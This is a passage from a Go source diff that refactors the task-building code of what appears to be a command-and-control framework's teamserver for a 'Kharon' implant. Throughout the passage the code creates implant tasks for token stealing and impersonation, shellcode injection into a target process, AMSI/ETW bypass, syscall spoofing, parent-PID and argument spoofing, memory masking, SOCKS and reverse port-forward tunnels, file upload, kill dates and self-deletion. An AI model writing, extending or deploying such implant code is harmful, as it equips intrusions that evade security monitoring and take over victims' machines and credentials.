 				goto RET
 			}
-
-			bofData, err := LoadExtModule("src_core", "cd", "x64")
+			bofData, err = LoadExtModule("src_core", "cd", "x64")
 			if err != nil {
 				goto RET
 			}
-
 			fmt.Printf("bof file content size: %d\n", len(bofData))
-
-			bofParam, err := PackExtData(
-				PackExtDataWChar(path, agent.ACP),
-			)
+			bofParam, err = PackExtData(PackExtDataWChar(path, agent.ACP))
 			if err != nil {
 				fmt.Printf("ERROR: %v\n", err)
 				goto RET
 			}
-
 			fmt.Printf("bof param content size: %d\n", len(bofParam))
-
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_CD, len(bofParam), bofParam}
 
 		case "cp":
@@ -1155,16 +1124,11 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'dst' must be set")
 				goto RET
 			}
-
-			bofData, err := LoadExtModule("src_core", "cp", "x64")
+			bofData, err = LoadExtModule("src_core", "cp", "x64")
 			if err != nil {
 				goto RET
 			}
-
-			bofParam, err := PackExtData(
-				PackExtDataWChar(src, agent.ACP),
-				PackExtDataWChar(dst, agent.ACP),
-			)
+			bofParam, err = PackExtData(PackExtDataWChar(src, agent.ACP), PackExtDataWChar(dst, agent.ACP))
 			if err != nil {
 				goto RET
 			}
@@ -1181,19 +1145,14 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			} else {
 				dir += "\\*"
 			}
-
-			bofData, err := LoadExtModule("src_core", "ls", "x64")
+			bofData, err = LoadExtModule("src_core", "ls", "x64")
 			if err != nil {
 				goto RET
 			}
-
-			bofParam, err := PackExtData(
-				PackExtDataWChar(dir, agent.ACP),
-			)
+			bofParam, err = PackExtData(PackExtDataWChar(dir, agent.ACP))
 			if err != nil {
 				goto RET
 			}
-
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, int(FS_LIST), len(bofParam), bofParam}
 
 		case "mv":
@@ -1207,16 +1166,11 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'dst' must be set")
 				goto RET
 			}
-
-			bofData, err := LoadExtModule("src_core", "mv", "x64")
+			bofData, err = LoadExtModule("src_core", "mv", "x64")
 			if err != nil {
 				goto RET
 			}
-
-			bofParam, err := PackExtData(
-				PackExtDataWChar(src, agent.ACP),
-				PackExtDataWChar(dst, agent.ACP),
-			)
+			bofParam, err = PackExtData(PackExtDataWChar(src, agent.ACP), PackExtDataWChar(dst, agent.ACP))
 			if err != nil {
 				goto RET
 			}
@@ -1228,28 +1182,22 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'path' must be set")
 				goto RET
 			}
-
-			bofData, err := LoadExtModule("src_core", "mkdir", "x64")
+			bofData, err = LoadExtModule("src_core", "mkdir", "x64")
 			if err != nil {
 				goto RET
 			}
-
-			bofParam, err := PackExtData(
-				PackExtDataWChar(path, agent.ACP),
-			)
+			bofParam, err = PackExtData(PackExtDataWChar(path, agent.ACP))
 			if err != nil {
 				goto RET
 			}
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_MKDIR, len(bofParam), bofParam}
 
 		case "pwd":
-			bofData, err := LoadExtModule("src_core", "pwd", "x64")
+			bofData, err = LoadExtModule("src_core", "pwd", "x64")
 			if err != nil {
 				goto RET
 			}
-
-			fmt.Printf("bof file content size: %d\n", bofData)
-
+			fmt.Printf("bof file content size: %d\n", len(bofData))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, 0, 0}
 
 		case "rm":
@@ -1258,15 +1206,11 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'path' must be set")
 				goto RET
 			}
-
-			bofData, err := LoadExtModule("src_core", "rm", "x64")
+			bofData, err = LoadExtModule("src_core", "rm", "x64")
 			if err != nil {
 				goto RET
 			}
-
-			bofParam, err := PackExtData(
-				PackExtDataWChar(path, agent.ACP),
-			)
+			bofParam, err = PackExtData(PackExtDataWChar(path, agent.ACP))
 			if err != nil {
 				goto RET
 			}
@@ -1290,16 +1234,13 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 	case "info":
 		console_out := FormatKharonTable(&kharon_cfg)
-
 		taskData.Type = ax.TASK_TYPE_LOCAL
-
-		taskData.Message   = "Kharon config informations:"
+		taskData.Message = "Kharon config informations:"
 		taskData.Completed = true
 		taskData.ClearText = console_out
 
 	case "socks":
 		taskData.Type = TYPE_TUNNEL
-
 		portNumber, ok := args["port"].(float64)
 		port := int(portNumber)
 		if ok {
@@ -1315,7 +1256,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'address' must be set")
 				goto RET
 			}
-
 			auth, _ := args["-a"].(bool)
 			if auth {
 				username, ok := args["username"].(string)
@@ -1328,21 +1268,19 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 					err = errors.New("parameter 'password' must be set")
 					goto RET
 				}
-
-				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, true, username, password)
+				var tunnelId string
+				tunnelId, err = ts.TsTunnelCreateSocks5(agent.Id, "", address, port, true, username, password)
 				if err != nil {
 					goto RET
 				}
-
 				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
 				if err != nil {
 					goto RET
 				}
-
 				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)
-
 			} else {
-				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, false, "", "")
+				var tunnelId string
+				tunnelId, err = ts.TsTunnelCreateSocks5(agent.Id, "", address, port, false, "", "")
 				if err != nil {
 					goto RET
 				}
@@ -1350,7 +1288,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				if err != nil {
 					goto RET
 				}
-
 				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
 			}
 			taskData.MessageType = MESSAGE_SUCCESS
@@ -1358,9 +1295,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 		case "stop":
 			taskData.Completed = true
-
 			ts.TsTunnelStopSocks(agent.Id, port)
-
 			taskData.MessageType = MESSAGE_SUCCESS
 			taskData.Message = "Socks5 server has been stopped"
 			taskData.ClearText = "\n"
@@ -1372,7 +1307,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 	case "rportfwd":
 		taskData.Type = TYPE_TUNNEL
-
 		lportNumber, ok := args["lport"].(float64)
 		lport := int(lportNumber)
 		if ok {
@@ -1381,7 +1315,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 		}
-
 		switch subcommand {
 		case "start":
 			fhost, ok := args["fwdhost"].(string)
@@ -1397,8 +1330,8 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 					goto RET
 				}
 			}
-
-			tunnelId, err := ts.TsTunnelCreateRportfwd(agent.Id, "", lport, fhost, fport)
+			var tunnelId string
+			tunnelId, err = ts.TsTunnelCreateRportfwd(agent.Id, "", lport, fhost, fport)
 			if err != nil {
 				goto RET
 			}
@@ -1406,15 +1339,12 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			if err != nil {
 				goto RET
 			}
-
 			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
 			messageData.Status = MESSAGE_INFO
 
 		case "stop":
 			taskData.Completed = true
-
 			ts.TsTunnelStopRportfwd(agent.Id, lport)
-
 			taskData.MessageType = MESSAGE_SUCCESS
 			taskData.Message = "Reverse port forwarding has been stopped"
 
@@ -1424,25 +1354,22 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		}
 
 	case "upload":
-
 		remote_path, ok := args["remote_path"].(string)
 		if !ok {
 			err = errors.New("parameter 'remote_path' must be set")
 			goto RET
 		}
-
 		localFile, ok := args["local_file"].(string)
 		if !ok {
 			err = errors.New("parameter 'local_file' must be set")
 			goto RET
 		}
-
-		fileContent, err := base64.StdEncoding.DecodeString(localFile)
+		var fileContent []byte
+		fileContent, err = base64.StdEncoding.DecodeString(localFile)
 		if err != nil {
 			goto RET
 		}
-
-		chunkSize := 0x500000 // 5Mb
+		chunkSize := 0x500000
 		bufferSize := len(fileContent)
 
 		inTaskData := ax.TaskData{
@@ -1450,17 +1377,14 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			AgentId: agent.Id,
 			Sync:    false,
 		}
-
 		fileID := gen_rnd_str(10)
 		inCmd := []interface{}{TASK_UPLOAD, int(0), ConvertUTF8toCp(fileID, agent.ACP), ConvertUTF8toCp(remote_path, agent.ACP)}
 		inTaskData.Data, _ = PackArray(inCmd)
 		inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
-
 		ts.TsTaskCreate(agent.Id, "", "", inTaskData)
 
 		numChunks := (bufferSize + chunkSize - 1) / chunkSize
 		i := 1
-
 		for start := 0; start < bufferSize; start += chunkSize {
 			fin := start + chunkSize
 			finish := false
@@ -1468,22 +1392,16 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				fin = bufferSize
 				finish = true
 			}
-
 			lenBytes := make([]byte, 4)
 			binary.LittleEndian.PutUint32(lenBytes, uint32(fin-start))
-
-			// Concatenate length + data
 			result := append(lenBytes, fileContent[start:fin]...)
 			inCmd := []interface{}{TASK_UPLOAD, int(1), ConvertUTF8toCp(fileID, agent.ACP), int(numChunks), int(i), len(fileContent[start:fin]), result}
-
 			if finish {
 				array = inCmd
 				break
-
 			} else {
 				inTaskData.Data, _ = PackArray(inCmd)
 				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
-
 				ts.TsTaskCreate(agent.Id, "", "", inTaskData)
 			}
 			i = i + 1
@@ -1502,10 +1420,8 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 	case "token":
 		switch subcommand {
-
 		case "getuid":
 			array = []interface{}{TASK_TOKEN, TOKEN_GET_UUID}
-
 		case "steal":
 			pid, ok := args["pid"].(float64)
 			if !ok {
@@ -1518,7 +1434,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				use = 1
 			}
 			array = []interface{}{TASK_TOKEN, TOKEN_STEAL, int(pid), use}
-
 		case "impersonate":
 			id, ok := get_int_from_args(args["token_id"])
 			fmt.Printf("token id: %d\n", id)
@@ -1527,10 +1442,8 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 			array = []interface{}{TASK_TOKEN, TOKEN_USE, int(id)}
-
 		case "list":
 			array = []interface{}{TASK_TOKEN, TOKEN_LIST}
-
 		case "rm":
 			id, ok := get_int_from_args(args["token_id"])
 			if !ok {
@@ -1538,45 +1451,37 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 			array = []interface{}{TASK_TOKEN, TOKEN_RM, int(id)}
-
 		case "revert":
 			array = []interface{}{TASK_TOKEN, TOKEN_REVERT}
-
 		case "make":
 			username, ok := args["username"].(string)
 			if !ok {
 				err = errors.New("parameter 'username' must be set")
 				goto RET
 			}
-			domain, ok := args["domain"].(string)
-
+			domain, _ := args["domain"].(string)
 			password, ok := args["password"].(string)
 			if !ok {
 				err = errors.New("parameter 'password' must be set")
 				goto RET
 			}
 			array = []interface{}{TASK_TOKEN, TOKEN_MAKE, ConvertUTF8toCp(username, agent.ACP), ConvertUTF8toCp(password, agent.ACP), ConvertUTF8toCp(domain, agent.ACP)}
-
 		case "privget":
 			array = []interface{}{TASK_TOKEN, TOKEN_PRIV_GET}
-
 		case "privlist":
 			array = []interface{}{TASK_TOKEN, TOKEN_PRIV_LIST}
-
 		default:
 			err = errors.New("subcommand for 'token': 'getuid', 'steal', 'use', 'rm', 'revert', 'make', 'privget', 'privlist'")
 			goto RET
 		}
 
 	case "config":
-
-		bofData, err := LoadExtModule("src_core", "config", "x64")
+		bofData, err = LoadExtModule("src_core", "config", "x64")
 		if err != nil {
 			goto RET
 		}
 
 		switch subcommand {
-
 		case "sleep":
 			var sleepTime int
 			sleep, sleepOk := args["val"].(string)
@@ -1584,13 +1489,12 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'val' must be set")
 				goto RET
 			}
-
-			sleepInt, err := strconv.Atoi(sleep)
-			if err == nil {
+			sleepInt, parseErr := strconv.Atoi(sleep)
+			if parseErr == nil {
 				sleepTime = sleepInt
 			} else {
-				t, err := time.ParseDuration(sleep)
-				if err == nil {
+				t, parseErr := time.ParseDuration(sleep)
+				if parseErr == nil {
 					sleepTime = int(t.Seconds())
 				} else {
 					err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
@@ -1598,18 +1502,11 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				}
 			}
 			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
-
 			agent.Sleep = uint(sleepTime)
-			kharon_cfg.session.sleep_time = uint32(sleepTime * 1000)
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			kharon_cfg.Session.SleepTime = uint32(sleepTime * 1000)
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			_ = ts.TsAgentUpdateData(agent)
-
-			bofParam, err := PackExtData(
-				int(CONFIG_SLEEP),
-				int(sleepTime),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_SLEEP), int(sleepTime))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "jitter":
@@ -1618,28 +1515,20 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'val' must be set")
 				goto RET
 			}
-
 			jitterTime := int(jitter)
 			if jitterTime < 0 || jitterTime > 100 {
 				err = errors.New("jitterTime must be from 0 to 100")
 				goto RET
 			}
 			messageData.Message = fmt.Sprintf("Task: sleep with %v%% jitter", jitterTime)
-
 			agent.Jitter = uint(jitterTime)
-			kharon_cfg.session.jitter = uint32(jitterTime)
-			agent.CustomData, _ = kharon_cfg.Marshal()
+			kharon_cfg.Session.Jitter = uint32(jitterTime)
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			_ = ts.TsAgentUpdateData(agent)
-
-			bofParam, err := PackExtData(
-				int(CONFIG_JITTER),
-				int(jitterTime),
-			)
+			bofParam, _ = PackExtData(int(CONFIG_JITTER), int(jitterTime))
 			if err != nil {
 				goto RET
 			}
-
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "ppid":
@@ -1648,54 +1537,22 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'pid' must be set")
 				goto RET
 			}
-			
-			kharon_cfg.ps.parent_id = uint32(pid)
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
+			kharon_cfg.Ps.ParentId = uint32(pid)
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_PPID),
-				int(pid),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_PPID), int(pid))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
-		case "argue":
-			argument, ok := args["argument"].(string)
+		case "spoofarg":
+			argument, ok := args["arg"].(string)
 			if !ok {
-				err = errors.New("parameter 'argument' must be set")
+				err = errors.New("parameter 'arg' must be set")
 				goto RET
 			}
+			kharon_cfg.Ps.Spoofarg = argument
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.ps.spoofarg = argument
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_ARGUE),
-				PackExtDataWChar(argument, agent.ACP),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_ARGUE), PackExtDataWChar(argument, agent.ACP))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "killdate.date":
@@ -1704,33 +1561,15 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'date' must be set")
 				goto RET
 			}
-
-			parsedDate, err := time.Parse("02.01.2006", dt)
+			var parsedDate time.Time
+			parsedDate, err = time.Parse("02.01.2006", dt)
 			if err != nil {
 				goto RET
 			}
+			kharon_cfg.Killdate.Date = parsedDate
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.killdate.date = parsedDate
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_KD_DATE),
-				int(int(parsedDate.Year())),
-				int(int(parsedDate.Month())),
-				int(int(parsedDate.Day())),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_KD_DATE), int(parsedDate.Year()), int(parsedDate.Month()), int(parsedDate.Day()))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "killdate.selfdel":
@@ -1739,7 +1578,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'status' must be set")
 				goto RET
 			}
-
 			enabled := 0
 			switch status {
 			case "true":
@@ -1750,26 +1588,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
+			kharon_cfg.Killdate.Selfdel = enabled != 0
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.killdate.selfdel = enabled != 0
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_KD_SELFDEL),
-				int(enabled),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_KD_SELFDEL), int(enabled))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "killdate.exit":
@@ -1778,7 +1600,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'method' must be set")
 				goto RET
 			}
-
 			enabled := 0
 			switch method {
 			case "process":
@@ -1789,26 +1610,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown method type. Type must be 'process' or 'thread'")
 				goto RET
 			}
+			kharon_cfg.Killdate.Exit = enabled != 0
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.killdate.exit = enabled != 0
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_KD_EXIT),
-				int(enabled),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_KD_EXIT), int(enabled))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "mask.beacon":
@@ -1817,7 +1622,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'type' must be set")
 				goto RET
 			}
-
 			num := 0
 			switch tp {
 			case "timer":
@@ -1828,26 +1632,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown mask type. Type must be 'none' or 'timer'")
 				goto RET
 			}
+			kharon_cfg.Mask.Beacon = uint32(num)
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.mask.beacon = uint32(num)
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_MASK),
-				int(num),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_MASK), int(num))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "mask.heap":
@@ -1856,7 +1644,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'status' must be set")
 				goto RET
 			}
-
 			enabled := 0
 			switch status {
 			case "true":
@@ -1867,26 +1654,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
-			
-			kharon_cfg.mask.heap = enabled != 0
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
+			kharon_cfg.Mask.Heap = enabled != 0
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_MASK_HEAP),
-				int(enabled),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_MASK_HEAP), int(enabled))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "spawnto":
@@ -1895,26 +1666,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'spawnto' must be set")
 				goto RET
 			}
+			kharon_cfg.Ps.Spawnto = spawnto
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.ps.spawnto = spawnto
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_SPAWN),
-				PackExtDataWChar(spawnto, agent.ACP),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_SPAWN), PackExtDataWChar(spawnto, agent.ACP))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "blockdlls":
@@ -1923,7 +1678,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'status' must be set")
 				goto RET
 			}
-
 			enabled := 0
 			switch status {
 			case "true":
@@ -1934,26 +1688,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
+			kharon_cfg.Ps.BlockDlls = enabled != 0
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.ps.block_dlls = enabled != 0
-
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_BLOCK_DLLS),
-				int(enabled),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_BLOCK_DLLS), int(enabled))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "amsi_etw_bypass":
@@ -1962,7 +1700,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'bypass' must be set")
 				goto RET
 			}
-
 			bypass_n := 0
 			switch bypass {
 			case "amsi":
@@ -1977,26 +1714,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown bypass type. Type must be 'amsi', 'etw', 'all' or 'none'")
 				goto RET
 			}
-	
-			kharon_cfg.evasion.amsi_etw_bypass = int32(bypass_n)
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
+			kharon_cfg.Evasion.AmsiEtwBypass = int32(bypass_n)
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_AE_BYPASS),
-				int(bypass_n),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_AE_BYPASS), int(bypass_n))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "syscall":
@@ -2005,9 +1726,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'syscall' must be set")
 				goto RET
 			}
-
 			syscall_n := 0
-
 			switch syscall {
 			case "spoof":
 				syscall_n = 1
@@ -2017,28 +1736,13 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				syscall_n = 0
 			default:
 				err = errors.New("Unknown syscall method. Syscall must be 'spoof', 'spoof_indirect' or 'none'")
+				fmt.Printf("default %v\n", err)
 				goto RET
 			}
+			kharon_cfg.Evasion.Syscall = uint32(syscall_n)
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.evasion.syscall = uint32(syscall_n)
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_SYSCALL),
-				int(syscall_n),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_SYSCALL), int(syscall_n))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "fork_pipe_name":
@@ -2047,26 +1751,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'name' must be set")
 				goto RET
 			}
+			kharon_cfg.Ps.ForkPipe = forkPipeName
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.ps.fork_pipe = forkPipeName
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_FORKPIPE),
-				PackExtDataWChar(forkPipeName, agent.ACP),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_FORKPIPE), PackExtDataString(forkPipeName, agent.ACP))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		case "bofproxy":
@@ -2075,31 +1763,14 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'status' must be set")
 				goto RET
 			}
-
 			enabled := 0
 			if status {
 				enabled = 1
 			}
+			kharon_cfg.Evasion.BofProxy = status
+			kharon_cfg.JsonMarshal(&agent, true)
 
-			kharon_cfg.evasion.bof_proxy = status
-			
-			NewCustomData, err := kharon_cfg.Marshal()
-			if err != nil {
-				goto RET
-			}
-
-			agent.CustomData = NewCustomData
-
-			err = ts.TsAgentUpdateData(agent)
-			if err != nil {
-				goto RET
-			}
-
-			bofParam, err := PackExtData(
-				int(CONFIG_BOFPROXY),
-				int(enabled),
-			)
-
+			bofParam, _ = PackExtData(int(CONFIG_BOFPROXY), int(enabled))
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}
 
 		default:
@@ -2118,39 +1789,33 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			err = errors.New("parameter 'pid' must be set")
 			goto RET
 		}
-
-		shellcodeContent, err := base64.StdEncoding.DecodeString(shellcode)
+		var shellcodeContent []byte
+		shellcodeContent, err = base64.StdEncoding.DecodeString(shellcode)
 		if err != nil {
 			goto RET
 		}
-
-		bofData, err := LoadExtModule("src_core", "scinject", "x64")
+		bofData, err = LoadExtModule("src_core", "scinject", "x64")
 		if err != nil {
 			goto RET
 		}
-
-		bofParam, err := PackExtData(
-			int(pid),
-			shellcodeContent,
-		)
+		bofParam, err = PackExtData(int(pid), shellcodeContent)
 		if err != nil {
 			goto RET
 		}
-
 		array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 	case "selfdel":
 		array = []interface{}{TASK_SELFDEL}
+
 	case "execute":
 		switch subcommand {
 		case "bof":
